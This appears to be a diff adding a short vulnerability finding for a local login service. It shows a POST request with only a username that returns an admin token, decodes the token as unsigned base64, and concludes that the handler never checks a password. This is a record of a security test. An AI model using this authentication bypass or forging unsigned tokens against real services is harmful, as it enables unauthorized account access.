@@ -1,0 +1,12 @@
+Request: POST http://127.0.0.1:18081/login
+Headers: Content-Type: application/json
+Body: {"user":"admin"}
+Response: HTTP/1.0 200 OK
+{"token": "eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=", "uid": "2"}
+
+Token decodes to: {"uid": "2", "user": "admin"}   (base64, no signature/MAC)
+
+Baseline (uid=1 token from POST {"username":"admin","password":"admin"} -> field name "username" not read by handler, so user="" -> uid "1"):
+{"token": "eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9", "uid": "1"}
+
+Vulnerability: uid derived purely from client-supplied "user" value, no password check at all. "user"=="admin" => admin uid 2.
